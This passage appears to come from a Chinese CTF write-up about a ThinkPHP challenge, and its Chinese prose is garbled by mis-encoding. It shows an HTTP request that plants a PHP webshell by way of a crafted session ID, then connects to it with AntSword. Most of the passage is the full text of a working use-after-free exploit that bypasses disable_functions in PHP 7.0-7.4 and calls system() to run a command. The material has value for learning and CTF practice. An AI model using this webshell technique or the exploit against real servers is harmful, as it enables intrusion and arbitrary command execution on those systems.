</span></span><span style=display:flex><span>                <span style=color:#a6e22e>session</span>(<span style=color:#e6db74>&#34;Record&#34;</span>,$data[<span style=color:#e6db74>&#34;key&#34;</span>]);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                $recordArr <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34;,&#34;</span>,$record);
</span></span><span style=display:flex><span>                $recordLen <span style=color:#f92672>=</span> <span style=color:#a6e22e>sizeof</span>($recordArr);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ($recordLen <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>3</span>){
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>array_shift</span>($recordArr);
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>session</span>(<span style=color:#e6db74>&#34;Record&#34;</span>,<span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#34;,&#34;</span>,$recordArr) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;,&#34;</span> <span style=color:#f92672>.</span> $data[<span style=color:#e6db74>&#34;key&#34;</span>]);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>View</span><span style=color:#f92672>::</span><span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;result&#34;</span>,[<span style=color:#e6db74>&#34;res&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;There&#39;s nothing here&#34;</span>]);
</span></span><span style=display:flex><span>                }
</span></span></code></pre></div><p>çœ‹wpäº†ï¼Œæ²¡å¤ªæ‡‚ï¼Œä¹‹åä¼šæŠŠthinkphpç³»ç»Ÿè¿‡ä¸€é</p><pre tabindex=0><code>POST /home/member/register HTTP/1.1
Host: 91f09434-610c-4ca7-8a25-63095e235f33.node5.buuoj.cn:81
Content-Length: 25
Cache-Control: max-age=0
Origin: http://91f09434-610c-4ca7-8a25-63095e235f33.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://91f09434-610c-4ca7-8a25-63095e235f33.node5.buuoj.cn:81/home/member/register
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=1234567890123456789012345678.php
Connection: close

username=123&amp;password=123
</code></pre><p>ç”¨è¿™ä¸ªæ³¨å†Œï¼Œç„¶åï¼Œå‘ä¸ªé©¬</p><p>é©¬ä¼šåœ¨</p><pre tabindex=0><code>/runtime/session/sess_1234567890123456789012345678.php
</code></pre><p>èšå‰‘è¿æ¥</p><p><a href=https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass>exploits/php7-backtrace-bypass at master Â· mm0r1/exploits</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Bug: https://bugs.php.net/bug.php?id=76047</span>
</span></span><span style=display:flex><span><span style=color:#75715e># debug_backtrace() returns a reference to a variable </span>
</span></span><span style=display:flex><span><span style=color:#75715e># that has been destroyed, causing a UAF vulnerability.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This exploit should work on all PHP 7.0-7.4 versions</span>
</span></span><span style=display:flex><span><span style=color:#75715e># released as of 30/01/2020.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: https://github.com/mm0r1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pwn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/readflag&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> pwn<span style=color:#f92672>(</span>$cmd<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    global $abc, $helper, $backtrace;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    class Vuln <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        public $a;
</span></span><span style=display:flex><span>        public <span style=color:#66d9ef>function</span> __destruct<span style=color:#f92672>()</span> <span style=color:#f92672>{</span> 
</span></span><span style=display:flex><span>            global $backtrace; 
</span></span><span style=display:flex><span>            unset<span style=color:#f92672>(</span>$this-&gt;a<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $backtrace <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>new Exception<span style=color:#f92672>)</span>-&gt;getTrace<span style=color:#f92672>()</span>; <span style=color:#75715e># ;)</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!isset<span style=color:#f92672>(</span>$backtrace<span style=color:#f92672>[</span>1<span style=color:#f92672>][</span><span style=color:#e6db74>&#39;args&#39;</span><span style=color:#f92672>]))</span> <span style=color:#f92672>{</span> <span style=color:#75715e># PHP &gt;= 7.4</span>
</span></span><span style=display:flex><span>                $backtrace <span style=color:#f92672>=</span> debug_backtrace<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    class Helper <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        public $a, $b, $c, $d;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> str2ptr<span style=color:#f92672>(</span>&amp;$str, $p <span style=color:#f92672>=</span> 0, $s <span style=color:#f92672>=</span> 8<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $address <span style=color:#f92672>=</span> 0;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$j <span style=color:#f92672>=</span> $s-1; $j &gt;<span style=color:#f92672>=</span> 0; $j--<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $address &lt;&lt;<span style=color:#f92672>=</span> 8;
</span></span><span style=display:flex><span>            $address |<span style=color:#f92672>=</span> ord<span style=color:#f92672>(</span>$str<span style=color:#f92672>[</span>$p+$j<span style=color:#f92672>])</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $address;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> ptr2str<span style=color:#f92672>(</span>$ptr, $m <span style=color:#f92672>=</span> 8<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $out <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>$i<span style=color:#f92672>=</span>0; $i &lt; $m; $i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $out .<span style=color:#f92672>=</span> chr<span style=color:#f92672>(</span>$ptr &amp; 0xff<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $ptr &gt;&gt;<span style=color:#f92672>=</span> 8;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $out;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> write<span style=color:#f92672>(</span>&amp;$str, $p, $v, $n <span style=color:#f92672>=</span> 8<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $i <span style=color:#f92672>=</span> 0;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i <span style=color:#f92672>=</span> 0; $i &lt; $n; $i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $str<span style=color:#f92672>[</span>$p + $i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> chr<span style=color:#f92672>(</span>$v &amp; 0xff<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $v &gt;&gt;<span style=color:#f92672>=</span> 8;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> leak<span style=color:#f92672>(</span>$addr, $p <span style=color:#f92672>=</span> 0, $s <span style=color:#f92672>=</span> 8<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        global $abc, $helper;
</span></span><span style=display:flex><span>        write<span style=color:#f92672>(</span>$abc, 0x68, $addr + $p - 0x10<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        $leak <span style=color:#f92672>=</span> strlen<span style=color:#f92672>(</span>$helper-&gt;a<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$s !<span style=color:#f92672>=</span> 8<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> $leak %<span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span> &lt;&lt; <span style=color:#f92672>(</span>$s * 8<span style=color:#f92672>)</span> - 1; <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $leak;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> parse_elf<span style=color:#f92672>(</span>$base<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $e_type <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$base, 0x10, 2<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $e_phoff <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$base, 0x20<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        $e_phentsize <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$base, 0x36, 2<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        $e_phnum <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$base, 0x38, 2<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i <span style=color:#f92672>=</span> 0; $i &lt; $e_phnum; $i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $header <span style=color:#f92672>=</span> $base + $e_phoff + $i * $e_phentsize;
</span></span><span style=display:flex><span>            $p_type  <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$header, 0, 4<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $p_flags <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$header, 4, 4<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $p_vaddr <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$header, 0x10<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $p_memsz <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$header, 0x28<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$p_type <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> $p_flags <span style=color:#f92672>==</span> 6<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#75715e># PT_LOAD, PF_Read_Write</span>
</span></span><span style=display:flex><span>                <span style=color:#75715e># handle pie</span>
</span></span><span style=display:flex><span>                $data_addr <span style=color:#f92672>=</span> $e_type <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> ? $p_vaddr : $base + $p_vaddr;
</span></span><span style=display:flex><span>                $data_size <span style=color:#f92672>=</span> $p_memsz;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$p_type <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> $p_flags <span style=color:#f92672>==</span> 5<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#75715e># PT_LOAD, PF_Read_exec</span>
</span></span><span style=display:flex><span>                $text_size <span style=color:#f92672>=</span> $p_memsz;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!$data_addr <span style=color:#f92672>||</span> !$text_size <span style=color:#f92672>||</span> !$data_size<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> false;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>[</span>$data_addr, $text_size, $data_size<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> get_basic_funcs<span style=color:#f92672>(</span>$base, $elf<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        list<span style=color:#f92672>(</span>$data_addr, $text_size, $data_size<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> $elf;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i <span style=color:#f92672>=</span> 0; $i &lt; $data_size / 8; $i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $leak <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$data_addr, $i * 8<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$leak - $base &gt; <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> $leak - $base &lt; $data_addr - $base<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                $deref <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$leak<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                <span style=color:#75715e># &#39;constant&#39; constant check</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$deref !<span style=color:#f92672>=</span> 0x746e6174736e6f63<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            $leak <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$data_addr, <span style=color:#f92672>(</span>$i + 4<span style=color:#f92672>)</span> * 8<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$leak - $base &gt; <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> $leak - $base &lt; $data_addr - $base<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                $deref <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$leak<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>                <span style=color:#75715e># &#39;bin2hex&#39; constant check</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$deref !<span style=color:#f92672>=</span> 0x786568326e6962<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> $data_addr + $i * 8;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> get_binary_base<span style=color:#f92672>(</span>$binary_leak<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $base <span style=color:#f92672>=</span> 0;
</span></span><span style=display:flex><span>        $start <span style=color:#f92672>=</span> $binary_leak &amp; 0xfffffffffffff000;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i <span style=color:#f92672>=</span> 0; $i &lt; 0x1000; $i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $addr <span style=color:#f92672>=</span> $start - 0x1000 * $i;
</span></span><span style=display:flex><span>            $leak <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$addr, 0, 7<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$leak <span style=color:#f92672>==</span> 0x10102464c457f<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#75715e># ELF header</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> $addr;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> get_system<span style=color:#f92672>(</span>$basic_funcs<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $addr <span style=color:#f92672>=</span> $basic_funcs;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>do</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            $f_entry <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$addr<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            $f_name <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$f_entry, 0, 6<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$f_name <span style=color:#f92672>==</span> 0x6d6574737973<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#75715e># system</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> leak<span style=color:#f92672>(</span>$addr + 8<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            $addr +<span style=color:#f92672>=</span> 0x20;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>$f_entry !<span style=color:#f92672>=</span> 0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> false;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> trigger_uaf<span style=color:#f92672>(</span>$arg<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># str_shuffle prevents opcache string interning</span>
</span></span><span style=display:flex><span>        $arg <span style=color:#f92672>=</span> str_shuffle<span style=color:#f92672>(</span>str_repeat<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;A&#39;</span>, 79<span style=color:#f92672>))</span>;
</span></span><span style=display:flex><span>        $vuln <span style=color:#f92672>=</span> new Vuln<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>        $vuln-&gt;a <span style=color:#f92672>=</span> $arg;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>stristr<span style=color:#f92672>(</span>PHP_OS, <span style=color:#e6db74>&#39;WIN&#39;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;This PoC is for *nix systems only.&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $n_alloc <span style=color:#f92672>=</span> 10; <span style=color:#75715e># increase this value if UAF fails</span>
</span></span><span style=display:flex><span>    $contiguous <span style=color:#f92672>=</span> <span style=color:#f92672>[]</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i <span style=color:#f92672>=</span> 0; $i &lt; $n_alloc; $i++<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        $contiguous<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> str_shuffle<span style=color:#f92672>(</span>str_repeat<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;A&#39;</span>, 79<span style=color:#f92672>))</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    trigger_uaf<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;x&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    $abc <span style=color:#f92672>=</span> $backtrace<span style=color:#f92672>[</span>1<span style=color:#f92672>][</span><span style=color:#e6db74>&#39;args&#39;</span><span style=color:#f92672>][</span>0<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $helper <span style=color:#f92672>=</span> new Helper;
</span></span><span style=display:flex><span>    $helper-&gt;b <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> <span style=color:#f92672>(</span>$x<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#f92672>}</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>strlen<span style=color:#f92672>(</span>$abc<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>79</span> <span style=color:#f92672>||</span> strlen<span style=color:#f92672>(</span>$abc<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;UAF failed&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># leaks</span>
</span></span><span style=display:flex><span>    $closure_handlers <span style=color:#f92672>=</span> str2ptr<span style=color:#f92672>(</span>$abc, 0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    $php_heap <span style=color:#f92672>=</span> str2ptr<span style=color:#f92672>(</span>$abc, 0x58<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    $abc_addr <span style=color:#f92672>=</span> $php_heap - 0xc8;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fake value</span>
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0x60, 2<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0x70, 6<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fake reference</span>
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0x10, $abc_addr + 0x60<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0x18, 0xa<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $closure_obj <span style=color:#f92672>=</span> str2ptr<span style=color:#f92672>(</span>$abc, 0x20<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $binary_leak <span style=color:#f92672>=</span> leak<span style=color:#f92672>(</span>$closure_handlers, 8<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!<span style=color:#f92672>(</span>$base <span style=color:#f92672>=</span> get_binary_base<span style=color:#f92672>(</span>$binary_leak<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Couldn&#39;t determine binary base address&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!<span style=color:#f92672>(</span>$elf <span style=color:#f92672>=</span> parse_elf<span style=color:#f92672>(</span>$base<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Couldn&#39;t parse ELF header&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!<span style=color:#f92672>(</span>$basic_funcs <span style=color:#f92672>=</span> get_basic_funcs<span style=color:#f92672>(</span>$base, $elf<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Couldn&#39;t get basic_functions address&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!<span style=color:#f92672>(</span>$zif_system <span style=color:#f92672>=</span> get_system<span style=color:#f92672>(</span>$basic_funcs<span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Couldn&#39;t get zif_system address&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fake closure object</span>
</span></span><span style=display:flex><span>    $fake_obj_offset <span style=color:#f92672>=</span> 0xd0;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i <span style=color:#f92672>=</span> 0; $i &lt; 0x110; $i +<span style=color:#f92672>=</span> 8<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        write<span style=color:#f92672>(</span>$abc, $fake_obj_offset + $i, leak<span style=color:#f92672>(</span>$closure_obj, $i<span style=color:#f92672>))</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># pwn</span>
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0x20, $abc_addr + $fake_obj_offset<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0xd0 + 0x38, 1, 4<span style=color:#f92672>)</span>; <span style=color:#75715e># internal func type</span>
</span></span><span style=display:flex><span>    write<span style=color:#f92672>(</span>$abc, 0xd0 + 0x68, $zif_system<span style=color:#f92672>)</span>; <span style=color:#75715e># internal func handler</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>$helper-&gt;b<span style=color:#f92672>)(</span>$cmd<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    exit<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>?&gt;
</span></span></code></pre></div><p>ç”¨è¿™ä¸ªææƒï¼Œæ”¾åœ¨è¿™é‡Œç„¶åè¯»å–flag</p><pre tabindex=0><code>runtime/session/1.php
